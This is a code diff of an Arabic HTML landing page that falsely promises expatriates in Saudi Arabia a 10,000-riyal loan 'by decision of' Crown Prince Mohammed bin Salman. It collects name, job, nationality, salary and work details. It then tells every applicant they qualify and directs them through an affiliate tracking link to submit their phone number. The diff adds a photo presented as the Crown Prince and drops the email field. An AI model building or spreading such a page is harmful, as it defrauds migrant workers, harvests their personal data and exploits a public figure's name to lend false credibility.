@@ -1,10 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+
+<html dir="rtl" lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>قرض الوافدين</title>
-  <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>قرض الوافدين</title>
+<style>
+  body { overflow-x: hidden; max-width: 100vw; }
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
 
     body {
@@ -155,67 +157,57 @@
   0%, 100% { background-color: #fff8b3; }
   50% { background-color: #ffe97a; }
 }
+
+@media (max-width: 768px) {
+  .mobile-only {
+    display: block !important;
+  }
+}
 </style>
 </head>
 <body>
-  <div class="overlay" id="main-screen">
-
-    <!-- Step 1 -->
-    <div class="box" id="form-box">
-      <h1>قرض 10,000 ريال للوافدين في السعودية!</h1>
-      <p>
-        بقرار من سمو ولي العهد محمد بن سلمان، احصل على قرض بقيمة 10,000 ريال<br>
+<div class="overlay" id="main-screen">
+<!-- Step 1 -->
+<div class="box" id="form-box"><img alt="صورة محمد بن سلمان" class="mobile-only" src="background.jpg" style="width: 100%; border-radius: 10px; margin-bottom: 10px; display: none;"/>
+<h1>قرض 10,000 ريال للوافدين في السعودية!</h1>
+<p>
+        بقرار من سمو ولي العهد محمد بن سلمان، احصل على قرض بقيمة 10,000 ريال<br/>
         إذا كنت مقيمًا منذ 3 أشهر وتمتلك شريحة جوال مسجلة باسمك أو باسم شخص ضامن ليك.
       </p>
-
-      <label>الاسم الكامل</label>
-      <input type="text" id="name" placeholder="الاسم الكامل" required />
-
-      <label>البريد الإلكتروني</label>
-      <input type="email" id="email" placeholder="البريد الإلكتروني" required />
-
-      <label>المهنة</label>
-      <input type="text" id="job" placeholder="مثال: مهندس / سائق / معلم / عامل" required />
-
-      
+<label>الاسم الكامل</label>
+<input id="name" placeholder="الاسم الكامل" required="" type="text"/>
+<label>المهنة</label>
+<input id="job" placeholder="مثال: مهندس / سائق / معلم / عامل" required="" type="text"/>
 <label>الجنسية</label>
-<input type="text" id="nationality" placeholder="مثال: مصري، باكستاني..." required />
-
+<input id="nationality" placeholder="مثال: مصري، باكستاني..." required="" type="text"/>
 <label>نوع القطاع</label>
-<select id="sector" required>
-  <option value="">اختر نوع القطاع</option>
-  <option value="حكومي">حكومي</option>
-  <option value="خاص">خاص</option>
-  <option value="عمل حر">عمل حر</option>
+<select id="sector" required="">
+<option value="">اختر نوع القطاع</option>
+<option value="حكومي">حكومي</option>
+<option value="خاص">خاص</option>
+<option value="عمل حر">عمل حر</option>
 </select>
-
 <label>مدة العمل</label>
-<select id="work_duration" required>
-  <option value="">اختر المدة</option>
-  <option value="أقل من سنة">أقل من سنة</option>
-  <option value="1-3 سنوات">1-3 سنوات</option>
-  <option value="أكثر من 3 سنوات">أكثر من 3 سنوات</option>
+<select id="work_duration" required="">
+<option value="">اختر المدة</option>
+<option value="أقل من سنة">أقل من سنة</option>
+<option value="1-3 سنوات">1-3 سنوات</option>
+<option value="أكثر من 3 سنوات">أكثر من 3 سنوات</option>
 </select>
-
 <label>الراتب الشهري</label>
-<input type="number" id="salary" placeholder="أدخل الراتب بالريال" required />
+<input id="salary" placeholder="أدخل الراتب بالريال" required="" type="number"/>
 <button onclick="submitForm()">تسجيل</button>
-    </div>
-
-    <!-- Step 2: Loading -->
-    <div class="box hidden" id="loading-box">
-      
+</div>
+<!-- Step 2: Loading -->
+<div class="box hidden" id="loading-box">
 <div class="loader"></div>
 <h1 class="loading">جاري معالجة طلبك...</h1>
-
-    </div>
-
-  </div>
-
-  <!-- Step 3: Success Fullscreen -->
-  <div class="overlay hidden success" id="success-screen">
-    <div class="box">
-      <h1>🎉 تهانينا!</h1><p style="font-size:1.1em;"><strong style='font-size:1.4em;'>أنت مؤهل للحصول على قرض 10,000 ريال سعودي</strong><br><br>    سيقوم أحد ممثلي خدمة العملاء بالاتصال بك خلال 24 ساعة<br>  لتحديد موعد ومكان المقابلة</p>
+</div>
+</div>
+<!-- Step 3: Success Fullscreen -->
+<div class="overlay hidden success" id="success-screen">
+<div class="box">
+<h1>🎉 تهانينا!</h1><p style="font-size:1.1em;"><strong style="font-size:1.4em;">أنت مؤهل للحصول على قرض 10,000 ريال سعودي</strong><br/><br/>    سيقوم أحد ممثلي خدمة العملاء بالاتصال بك خلال 24 ساعة<br/>  لتحديد موعد ومكان المقابلة</p>
 <div class="cta-box bounce" style="
   background: white;
   color: black;
@@ -227,16 +219,14 @@
   box-shadow: 0 4px 12px rgba(0,0,0,0.2);
   animation: pulse 1.5s infinite;
 ">
-  <a href="https://www.gamee.forum/click?offer_id=27844&pub_id=270709&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE"
-     style="text-decoration: none; color: black;">
+<a href="https://www.gamee.forum/click?offer_id=27844&pub_id=270709&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" style="text-decoration: none; color: black;">
     سجل رقم هاتفك الآن لمتابعة الإجراءات
   </a>
 </div>
 </div>
-    </div>
-  </div>
+</div>
 
-  <script>
+<script>
     function submitForm() {
       const name = document.getElementById('name').value.trim();
       const email = document.getElementById('email').value.trim();
